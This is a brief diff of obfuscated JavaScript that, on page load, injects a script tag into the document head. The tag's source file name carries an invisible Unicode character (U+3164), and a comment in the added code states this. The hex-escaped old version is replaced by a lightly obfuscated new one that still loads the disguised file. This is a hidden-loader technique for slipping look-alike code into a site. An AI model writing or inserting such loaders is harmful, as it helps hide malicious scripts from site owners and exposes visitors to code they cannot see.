@@ -1,4 +1,19 @@
 (function(){
-  var _0x1f=["\x6D\x79\x53\x63\x72\x69\x70\x74","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x73\x63\x72\x69\x70\x74\u3164\x2E\x6A\x73","\x69\x64","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64"]; 
-  if(!document[_0x1f[1]](_0x1f[0])){var _0x2a=document[_0x1f[2]]("\x73\x63\x72\x69\x70\x74");_0x2a[_0x1f[3]]=_0x1f[4];_0x2a[_0x1f[5]]=_0x1f[0];document["\x68\x65\x61\x64"][_0x1f[6]](_0x2a);}
+  var _0x5a1e = [
+    'getElementById',
+    'createElement',
+    'script',
+    'src',
+    'script3\u3164.js', // using invisible Hangul filler (U+3164)
+    'id',
+    'myScript',
+    'appendChild',
+    'head'
+  ];
+  if (!document[_0x5a1e[0]](_0x5a1e[6])) {
+    var s = document[_0x5a1e[1]](_0x5a1e[2]);
+    s[_0x5a1e[3]] = _0x5a1e[4];
+    s[_0x5a1e[5]] = _0x5a1e[6];
+    document[_0x5a1e[8]][_0x5a1e[7]](s);
+  }
 })();
